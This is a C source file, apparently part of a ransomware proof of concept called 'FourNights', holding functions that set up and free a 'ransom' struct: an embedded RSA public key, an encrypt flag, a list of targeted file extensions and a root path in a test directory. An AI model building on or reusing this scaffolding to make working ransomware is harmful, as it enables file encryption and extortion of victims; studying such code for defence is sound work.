#include "fournights.h"

/**
  * init_struct - la
  * @ransom: la
  * Return: la
 **/
ransom_t *init_struct(ransom_t *ransom)
{
	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
	char *rsa_key = "-----BEGIN PUBLIC KEY-----\n" \
		"MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAv22Pgh7eyki7VbeUoueS\n" \
		"QDflozzdF8A+T9mMk/LlyPvUR5wXfDWkxW6a2rTd/qNBUPgd9YI3IqKuyT6zB9/P\n" \
		"NeZ2sI2M65iUWkOjlHDo5woNLoVYJuJR6FFAwybZLeIat3oIO+A/ow0y78S8mssS\n" \
		"BMZyy8OfAya3AieH9LSzpqjWTxhRwlScjH+StCmZPo7Lmtc4iDdcal8NNFpcx3rQ\n" \
		"dLEMU8zyfYbrqu1JEX003lx1G+/qcBoUo0hvf7gDAxOnvT1iMjtAIYKAa/vWK/eo\n" \
		"CeLzy1tr/cVQbzQCAkpmVFf5a31Idp7cEff46nup+Y2c0NNxI5SdjgJ+wKuJ/9QD\n" \
		"yvd1leJzYELj6qhh6GfoQy9W/Ey8h4pO4574QSdqMJ9DIzlpWhYEcM7VDZMIFaX6\n" \
		"v7N5akfByb5QmMW12mIWUyRgBbXtBmLkC4VMdMww+938jb9FhBmC/fDI74sQumJr\n" \
		"WuYr+HmrRMhaaJ/GnaI2i+3BSVoMLwUBEdYo4IZiEw9fzYSHqSRtkzYjJOryd+dm\n" \
		"a5xn+KX/DMAaWLeCrXtPnXnSk6rY5Bv0eM3hM1pxHRtUDW0g8WTwMPfjXjXwz8Lc\n" \
		"5okuO9xQ882mGJip85DROg2yr2nOKh9a++EjXNxTVXpC4IWj/CTp+dBfhVSpCWVp\n" \
		"QGh0vTU2N+90uxZAlEfOrcsCAwEAAQ==\n" \
		"-----END PUBLIC KEY-----\n";
#ifndef NO_DEBUG
	int i = 0;
#endif

	TMP_BUFS = malloc(sizeof(target_file_t));
	/**
	  * build target_file_s part of ransom struct
	  * by allocating space for temporary buffers
	 **/
	TMP_BUFS->filepath = my_calloc(PATH_MAX, sizeof(char));
	TMP_BUFS->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
	TMP_BUFS->cipher_buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
	/* init file_offset and bytes_read */
	TMP_BUFS->file_offset = 0;
	TMP_BUFS->bytes_read = 0;

	ransom->rsa_key = (unsigned char *)rsa_key;
	ransom->cipher_flag = 'e'; /* set cipher_flag to encrypt */
	ransom->root_path = "/home/vagrant/FourNights/TESTS/";
	lstat(file_exts, &(TMP_BUFS->file_info));
	if(read_file(file_exts, ransom, tokenizer) < 1)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "No Bytes read\n");
#endif
		return(NULL);
	}
	/* reset file_offset and bytes_read */
	TMP_BUFS->file_offset = 0;
	TMP_BUFS->bytes_read = 0;

	/* Struct Built. */
#ifndef NO_DEBUG
	printf("root_path: %s\n", ransom->root_path);
	for (i = 0; ransom->file_extensions[i]; i++)
		printf("%s%s", i ? ", " : "", ransom->file_extensions[i]);
#ifndef NO_OBFUSCATION
	printf("\nKey: %s\n", ransom->key);
	printf("salt: %lu\n", (unsigned long)ransom->salt);
#endif
	printf("Exiting init_struct function\n");
#endif
	return(ransom);
}

/**
  * free_ransom_struct - Frees all malloced space in the struct
  * @ransom: struct to free
 **/
void free_ransom_struct(ransom_t *ransom)
{
	free(TMP_BUFS->buf);
	TMP_BUFS->buf = NULL;
	free(TMP_BUFS->filepath);
	TMP_BUFS->filepath = NULL;
	free(TMP_BUFS);
	TMP_BUFS = NULL;

	ransom->root_path = NULL;
	free(ransom->file_exts_whole_str);
	ransom->file_exts_whole_str = NULL;
	free(ransom->file_extensions);
	ransom->file_extensions = NULL;
	ransom = NULL;
}
